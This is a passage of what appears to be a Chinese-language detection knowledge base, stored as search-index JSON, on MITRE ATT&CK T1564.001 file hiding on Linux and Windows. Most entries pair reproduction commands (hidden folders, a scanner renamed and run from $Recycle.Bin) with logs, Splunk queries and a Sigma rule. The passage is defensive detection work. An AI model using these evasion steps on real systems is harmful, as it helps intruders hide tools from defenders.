002\u7528\u6237\u5fc5\u987b\u660e\u786e\u8981\u6c42\u901a\u8fc7\u4e00\u7cfb\u5217\u56fe\u5f62\u7528\u6237\u754c\u9762\uff08GUI\uff09\u63d0\u793a\u6216\u547d\u4ee4\u884c\u67e5\u770b\u9690\u85cf\u6587\u4ef6\u3002\u4f8b\u5982\uff08windows\u4e0b\u7684dir /a\uff0clinux\u6216MAC\u4e0b\u7684ls -a\u547d\u4ee4\u7b49\uff09</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u9690\u85cf\u7cfb\u7edf\u4e2d\u4efb\u4f55\u4f4d\u7f6e\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u4ee5\u4fbf\u6301\u4e45\u5316\u5e76\u9003\u907f\u4e0d\u8fdb\u884c\u9690\u85cf\u6587\u4ef6\u5206\u6790\u7684\u7528\u6237\u6216\u5206\u6790\u5e08\u3002</p> <p>linux/mac</p> <p>\u7528\u6237\u53ef\u4ee5\u5c06\u7279\u5b9a\u6587\u4ef6\u6807\u8bb0\u4e3a\u9690\u85cf\uff0c\u53ea\u9700\u5c06\u201c.\u201d\u4f5c\u4e3a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u540d\u79f0\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ee5\u70b9\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u65e0\u6cd5\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u548c\u6807\u51c6\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982\u201cls\u201d\uff09\u4e2d\u67e5\u770b\u3002\u7528\u6237\u5fc5\u987b\u4e13\u95e8\u66f4\u6539\u8bbe\u7f6e\u624d\u80fd\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\u3002\u5bf9\u4e8e\u547d\u4ee4\u884c\u7528\u6cd5\uff0c\u901a\u5e38\u4f1a\u6709\u4e00\u4e2a\u6807\u5fd7\u6765\u67e5\u770b\u6240\u6709\u6587\u4ef6\uff08\u5305\u62ec\u9690\u85cf\u6587\u4ef6\uff09\u3002\u8981\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u4e2d\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5fc5\u987b\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1adefaults write com.apple.finder AppleShowAllFiles YES\uff0c\u7136\u540e\u91cd\u65b0\u542f\u52a8Finder\u5e94\u7528\u7a0b\u5e8f\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>mkdir .xx-a   #\u521b\u5efa\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6\u5939</p> <p>mv file to a  .file   #\u79fb\u52a8\u6587\u4ef6\u5230\u76ee\u5f55a\u4e0b\u5e76\u4fee\u6539\u4e3a\u9690\u85cf\u6587\u4ef6</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>bash\u5386\u53f2\u8bb0\u5f55</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u53ef\u4ee5\u4ece\u4e00\u4e9b\u7279\u5b9a\u76ee\u5f55\u8def\u5f84\u4e2d\u67e5\u627e\u5230\u9690\u85cf\u6587\u4ef6/\u76ee\u5f55\uff0c\u5e76\u5c06\u5176\u8f6c\u50a8\u5230\u67d0\u4e2a\u4f4d\u7f6e\u3002\u63d0\u53d6\u51fa\u53ef\u4ee5\u6587\u4ef6\u5939\u5e76\u67e5\u627e\u6076\u610f\u9690\u85cf\u6587\u4ef6\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>icbc@icbc:/xx$ sudo mkdir .xx-a</p> <p>icbc@icbc:/xx$ sudo mv 1.sh /xx/.sh</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>icbc@icbc:/$ history</p> <p>1  sudo mkdir .xx-a</p> <p>2  sudo mv 1.sh /xx/.sh</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#splunk","title":"splunk\u89c4\u5219","text":"<p>index=linux sourcetype=bash_history bash_command=\"mkdir .*\" | table host,user_name,bash_command</p> <p>index=linux sourcetype=bash_history bash_command=\"mv .\" | table host,user_name,bash_command</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_6","title":"\u5efa\u8bae","text":"<p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u76f4\u63a5\u5728\u95ee\u9898\u4e3b\u673a\u4e0a\u8fdb\u884c\u67e5\u627e\uff0c\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u767d\u540d\u5355\u6765\u8fc7\u6ee4\u6389linux\u7cfb\u7edf\u4e2d\u7684\u6807\u51c6\u9690\u85cf\u6587\u4ef6/\u76ee\u5f55\u3002\u8fd9\u6837\u53ef\u4ee5\u51cf\u8f7b\u8bef\u62a5\u3002</p> <p>find_hidden_files.sh</p> <pre><code>find /home/ -name \".*\"\nfind /home/ -type d -name \".*\"\nfind /home/ -type f -name \".*\"\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1564-001</p> <p>https://attack.mitre.org/techniques/T1564/001/</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/","title":"T1564-001-win-\u53d1\u73b0\u653b\u51fb\u8005\u5728\u56de\u6536\u7ad9\u4e2d\u9690\u85cf\u6076\u610f\u8f6f\u4ef6","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u6587\u4ef6\u548c\u76ee\u5f55\u8bbe\u7f6e\u4e3a\u9690\u85cf\uff0c\u4ee5\u9003\u907f\u68c0\u6d4b\u673a\u5236\u3002\u4e3a\u4e86\u9632\u6b62\u666e\u901a\u7528\u6237\u610f\u5916\u66f4\u6539\u7cfb\u7edf\u4e0a\u7684\u7279\u6b8a\u6587\u4ef6\uff0c\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u5177\u6709\u201c\u9690\u85cf\u201d\u6587\u4ef6\u7684\u529f\u80fd\u3002\u5f53\u7528\u6237\u4f7f\u7528GUI\u6d4f\u89c8\u6587\u4ef6\u7cfb\u7edf\u6216\u5728\u547d\u4ee4\u884c\u4e0a\u4f7f\u7528\u5e38\u89c4\u547d\u4ee4\u65f6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4e0d\u4f1a\u663e\u793a\u3002\u7528\u6237\u5fc5\u987b\u901a\u8fc7\u4e00\u7cfb\u5217\u56fe\u5f62\u7528\u6237\u754c\u9762\uff08GUI\uff09\u63d0\u793a\u6216\u4f7f\u7528\u547d\u4ee4\u884c\u5f00\u5173\uff08\u5bf9\u4e8eWindows\u4e3adir /a\uff0c\u5bf9\u4e8eLinux\u548cmacOS\u4e3als \u2013a\uff09\u660e\u786e\u8981\u6c42\u663e\u793a\u9690\u85cf\u6587\u4ef6\u3002</p> <p>\u5728Linux\u548cMac\u4e0a\uff0c\u7528\u6237\u53ea\u9700\u5c06\u201c.\u201d\u6807\u8bb0\u4e3a\u9690\u85cf\uff0c\u5373\u53ef\u5c06\u5176\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u4f5c\u4e3a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u540d\u79f0\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ee5\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u548c\u6807\u51c6\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982\u201c ls\u201d\uff09\u4e2d\u4e0d\u4f1a\u9690\u85cf\u3002\u7528\u6237\u5fc5\u987b\u4e13\u95e8\u66f4\u6539\u8bbe\u7f6e\u624d\u80fd\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\u3002</p> <p>macOS\u4e0a\u7684\u6587\u4ef6\u4e5f\u53ef\u4ee5\u7528UF_HIDDEN\u6807\u5fd7\u6807\u8bb0\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u5728Finder.app\u4e2d\u770b\u5230\u5b83\u4eec\uff0c\u4f46\u4ecd\u7136\u5141\u8bb8\u5728Terminal.app \u4e2d\u770b\u5230\u5b83\u4eec\u3002\u5728Windows\u4e0a\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528attrib.exe\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u7279\u5b9a\u6587\u4ef6\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f1a\u521b\u5efa\u8fd9\u4e9b\u9690\u85cf\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u6765\u5b58\u50a8\u4fe1\u606f\uff0c\u4ee5\u514d\u4f7f\u7528\u6237\u7684\u5de5\u4f5c\u7a7a\u95f4\u53d8\u5f97\u6df7\u4e71\u3002\u4f8b\u5982\uff0cSSH\u5b9e\u7528\u7a0b\u5e8f\u4f1a\u521b\u5efa\u4e00\u4e2a.ssh\u6587\u4ef6\u5939\uff0c\u8be5\u6587\u4ef6\u5939\u5904\u4e8e\u9690\u85cf\u72b6\u6001\uff0c\u5176\u4e2d\u5305\u542b\u7528\u6237\u7684\u5df2\u77e5\u4e3b\u673a\u548c\u5bc6\u94a5\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u4f18\u52bf\u6765\u9690\u85cf\u7cfb\u7edf\u4e0a\u4efb\u4f55\u4f4d\u7f6e\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u5e76\u9003\u907f\u4e0d\u5305\u542b\u5bf9\u9690\u85cf\u6587\u4ef6\u7684\u8c03\u67e5\u7684\u5178\u578b\u7528\u6237\u6216\u7cfb\u7edf\u5206\u6790\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u653b\u51fb\u8005\u8c03\u7528\u9690\u85cf\u5728\u56de\u6536\u7ad9\u4e2d\u7684\u6076\u610f\u7a0b\u5e8f\u3002$recycle.bin\u6587\u4ef6\u5939\u662f\u7cfb\u7edf\u91cd\u8981\u7684\u9690\u85cf\u6587\u4ef6\uff0c\u4e00\u822c\u5b58\u5728\u4e8e\u78c1\u76d8\u6839\u76ee\u5f55\u4e0b\u3002\u662f\u7cfb\u7edf\u201c\u56de\u6536\u7ad9\u201d\u5728\u6bcf\u4e00\u4e2a\u78c1\u76d8\u4e0a\u7684\u94fe\u63a5\u6587\u4ef6\u5939\uff0c\u7528\u4e8e\u4fdd\u5b58\u78c1\u76d8\u4e0a\u5220\u9664\u7684\u6587\u4ef6\u6216\u8005\u6587\u4ef6\u5939\u4fe1\u606f\uff0c\u6211\u4eec\u6062\u590d\u8bef\u5220\u9664\u5230\u56de\u6536\u7ad9\u4e2d\u7684\u6587\u4ef6\u6216\u8005\u6587\u4ef6\u5939\u65f6\u5927\u6709\u7528\u5904\u3002\u4e00\u822c\u6211\u4eec\u8bbe\u7f6e\u663e\u793a\u78c1\u76d8\u7684\u9690\u85cf\u6587\u4ef6\u540e\uff0c\u624d\u80fd\u770b\u5230\u5b83\u3002</p> <p>Win Vista\u4ee5\u524dWindows\u7cfb\u7edf\uff0c\u8be5\u6587\u4ef6\u5939\u540d\u79f0\u4e3a\uff1aRecycle ;Win Vista(Win7/8)\u4ee5\u540e\u7cfb\u7edf\u4e00\u822c\u540d\u79f0\u4e3a$RECYCLE.BIN \u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Windows\\system32&gt;C:\\$Recycle.bin\\$R54R99P.exe\nnbtscan 1.0.35 - 2008-04-08 - http://www.unixwiz.net/tools/\n\nusage: C:\\$Recycle.bin\\$R54R99P.exe [options] target [targets...]\n\nTargets are lists of IP addresses, DNS names, or address\n   ranges. Ranges can be in /nbits notation (\"192.168.12.0/24\")\nor with a range in the last octet (\"192.168.12.64-97\")\n\n-V        show Version information\n   -f        show Full NBT resource record responses (recommended)\n-H        generate HTTP headers\n   -v        turn on more Verbose debugging\n   -n        No looking up inverse names of IP addresses responding\n   -p &lt;n&gt;    bind to UDP Port &lt;n&gt; (default=0)\n-m        include MAC address in response (implied by '-f')\n-T &lt;n&gt;    Timeout the no-responses in &lt;n&gt; seconds (default=2 secs)\n-w &lt;n&gt;    Wait &lt;n&gt; msecs after each write (default=10 ms)\n-t &lt;n&gt;    Try each address &lt;n&gt; tries (default=1)\n-1        Use Winsock 1 only\n   -P        generate results in perl hashref format\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p> <pre><code>windows server 2016 \u5b89\u5168\u65e5\u5fd7\uff0c\u4e8b\u4ef6ID\uff1a4688\n\u65e5\u5fd7\u540d\u79f0:          Security\n\u6765\u6e90:            Microsoft-Windows-Security-Auditing\n\u65e5\u671f:            2021/4/6 17:39:04\n\u4e8b\u4ef6 ID:         4688\n\u4efb\u52a1\u7c7b\u522b:          \u8fdb\u7a0b\u521b\u5efa\n\u7ea7\u522b:            \u4fe1\u606f\n\u5173\u952e\u5b57:           \u5ba1\u6838\u6210\u529f\n\u7528\u6237:            \u6682\u7f3a\n\u8ba1\u7b97\u673a:           12306BR0B4DD.361a.com\n\u63cf\u8ff0:\n\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\n\n\u521b\u5efa\u8005\u4e3b\u9898:\n \u5b89\u5168 ID:  361A\\12306br0\n \u5e10\u6237\u540d:  12306br0\n \u5e10\u6237\u57df:  361A\n \u767b\u5f55 ID:  0x507C3\n\n\u76ee\u6807\u4e3b\u9898:\n \u5b89\u5168 ID:  NULL SID\n \u5e10\u6237\u540d:  -\n \u5e10\u6237\u57df:  -\n \u767b\u5f55 ID:  0x0\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u65b0\u8fdb\u7a0b ID:  0x1224\n \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\$Recycle.Bin\\$R54R99P.exe\n \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1937\n \u5f3a\u5236\u6027\u6807\u7b7e:  Mandatory Label\\High Mandatory Level\n \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x15d8\n \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe\n \u8fdb\u7a0b\u547d\u4ee4\u884c: C:\\$Recycle.bin\\$R54R99P.exe\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<pre><code>title: \u53d1\u73b0\u653b\u51fb\u8005\u5728\u56de\u6536\u7ad9\u4e2d\u9690\u85cf\u6076\u610f\u8f6f\u4ef6\ndescription: \u68c0\u6d4b\u653b\u51fb\u8005\u6267\u884c\u9690\u85cf\u5728\u56de\u6536\u7ad9\u4e2d\u7684\u6076\u610f\u7a0b\u5e8f\nstatus: experimental\nreferences:\n    - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/Malware_In_recyclebin.txt\nlogsource:\n\u200b    product: windows\n\u200b    service: security\ndetection:\n\u200b    selection:\n\u200b        EventID: 4688 #Windows \u5b89\u5168\u65e5\u5fd7\uff0c\u8fdb\u7a0b\u521b\u5efa\n        ParentProcessName: \n           - 'cmd.exe'\n           - 'ftp.exe'\n           - 'schtasks.exe'\n           - 'powershell.exe'\n           - 'rundll32.exe'\n           - 'regsvr32.exe'\n           - 'msiexec.exe'\n      Commanline: '*Recycle*'\n\u200b    condition: selection\nlevel: high\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_6","title":"\u5efa\u8bae","text":"<p>\u57fa\u4e8ewindows\u5b89\u5168\u65e5\u5fd7\uff08\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\uff09\u6216\u8005Sysmon\u65e5\u5fd7\u53ef\u8fdb\u884c\u6709\u6548\u68c0\u6d4b\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1564-001</p> <p>https://attack.mitre.org/techniques/T1564/001/</p> <p>windows10\u7cfb\u7edf$recycle.bin\u7684\u8be6\u7ec6\u5220\u9664\u65b9\u6cd5\u4ecb\u7ecd</p> <p>https://www.pconline.com.cn/win10/1102/11023668.html</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/","title":"T1564-001-win-\u9690\u85cf\u7684\u6587\u4ef6\u548c\u76ee\u5f55","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u6587\u4ef6\u548c\u76ee\u5f55\u8bbe\u7f6e\u4e3a\u9690\u85cf\uff0c\u4ee5\u9003\u907f\u68c0\u6d4b\u673a\u5236\u3002\u4e3a\u4e86\u9632\u6b62\u666e\u901a\u7528\u6237\u610f\u5916\u66f4\u6539\u7cfb\u7edf\u4e0a\u7684\u7279\u6b8a\u6587\u4ef6\uff0c\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u5177\u6709\u201c\u9690\u85cf\u201d\u6587\u4ef6\u7684\u529f\u80fd\u3002\u5f53\u7528\u6237\u4f7f\u7528GUI\u6d4f\u89c8\u6587\u4ef6\u7cfb\u7edf\u6216\u5728\u547d\u4ee4\u884c\u4e0a\u4f7f\u7528\u5e38\u89c4\u547d\u4ee4\u65f6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4e0d\u4f1a\u663e\u793a\u3002\u7528\u6237\u5fc5\u987b\u901a\u8fc7\u4e00\u7cfb\u5217\u56fe\u5f62\u7528\u6237\u754c\u9762\uff08GUI\uff09\u63d0\u793a\u6216\u4f7f\u7528\u547d\u4ee4\u884c\u5f00\u5173\uff08\u5bf9\u4e8eWindows\u4e3adir /a\uff0c\u5bf9\u4e8eLinux\u548cmacOS\u4e3als \u2013a\uff09\u660e\u786e\u8981\u6c42\u663e\u793a\u9690\u85cf\u6587\u4ef6\u3002</p> <p>\u5728Linux\u548cMac\u4e0a\uff0c\u7528\u6237\u53ea\u9700\u5c06\u201c.\u201d\u6807\u8bb0\u4e3a\u9690\u85cf\uff0c\u5373\u53ef\u5c06\u5176\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u4f5c\u4e3a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u540d\u79f0\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ee5\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u548c\u6807\u51c6\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982\u201c ls\u201d\uff09\u4e2d\u4e0d\u4f1a\u9690\u85cf\u3002\u7528\u6237\u5fc5\u987b\u4e13\u95e8\u66f4\u6539\u8bbe\u7f6e\u624d\u80fd\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\u3002</p> <p>macOS\u4e0a\u7684\u6587\u4ef6\u4e5f\u53ef\u4ee5\u7528UF_HIDDEN\u6807\u5fd7\u6807\u8bb0\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u5728Finder.app\u4e2d\u770b\u5230\u5b83\u4eec\uff0c\u4f46\u4ecd\u7136\u5141\u8bb8\u5728Terminal.app \u4e2d\u770b\u5230\u5b83\u4eec\u3002\u5728Windows\u4e0a\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528attrib.exe\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u7279\u5b9a\u6587\u4ef6\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f1a\u521b\u5efa\u8fd9\u4e9b\u9690\u85cf\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u6765\u5b58\u50a8\u4fe1\u606f\uff0c\u4ee5\u514d\u4f7f\u7528\u6237\u7684\u5de5\u4f5c\u7a7a\u95f4\u53d8\u5f97\u6df7\u4e71\u3002\u4f8b\u5982\uff0cSSH\u5b9e\u7528\u7a0b\u5e8f\u4f1a\u521b\u5efa\u4e00\u4e2a.ssh\u6587\u4ef6\u5939\uff0c\u8be5\u6587\u4ef6\u5939\u5904\u4e8e\u9690\u85cf\u72b6\u6001\uff0c\u5176\u4e2d\u5305\u542b\u7528\u6237\u7684\u5df2\u77e5\u4e3b\u673a\u548c\u5bc6\u94a5\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u4f18\u52bf\u6765\u9690\u85cf\u7cfb\u7edf\u4e0a\u4efb\u4f55\u4f4d\u7f6e\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u5e76\u9003\u907f\u4e0d\u5305\u542b\u5bf9\u9690\u85cf\u6587\u4ef6\u7684\u8c03\u67e5\u7684\u5178\u578b\u7528\u6237\u6216\u7cfb\u7edf\u5206\u6790\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Attrib.exe\u662f\u4f4d\u4e8eC\\Windows\\System32\u6587\u4ef6\u5939\u4e2d\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u3002\u5b83\u5141\u8bb8\u60a8\u663e\u793a\u6216\u66f4\u6539\u6587\u4ef6\u5c5e\u6027\u3002attrib\u547d\u4ee4\u7684\u529f\u80fd\u662f\u8bbe\u7f6e\uff0c\u66f4\u6539\u6216\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6\u5c5e\u6027\u4f7f\u7528attrib\u547d\u4ee4\uff0c\u53ef\u4ee5\u4f7f\u6587\u4ef6\u4e3a\u53ea\u8bfb\uff0c\u5f52\u6863\uff0c\u7cfb\u7edf\u548c\u9690\u85cf\u3002</p> <p>\u4ec0\u4e48\u662f\u6587\u4ef6\u5c5e\u6027\uff1f</p> <p>A\u6587\u4ef6\u5c5e\u6027\u662f\u4e0e\u8ba1\u7b97\u673a\u4e0a\u7684\u4efb\u4f55\u6587\u4ef6\u76f8\u5173\u8054\u7684\u5143\u6570\u636e\uff0c\u63cf\u8ff0\u6216\u8ddf\u8e2a\u6587\u4ef6\u521b\u5efa\u6216\u4fee\u6539\uff0c\u6587\u4ef6\u5927\u5c0f\uff0c\u6587\u4ef6\u6269\u5c55\u540d\u548c\u6587\u4ef6\u6743\u9650\u7b49\u4fe1\u606f\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows 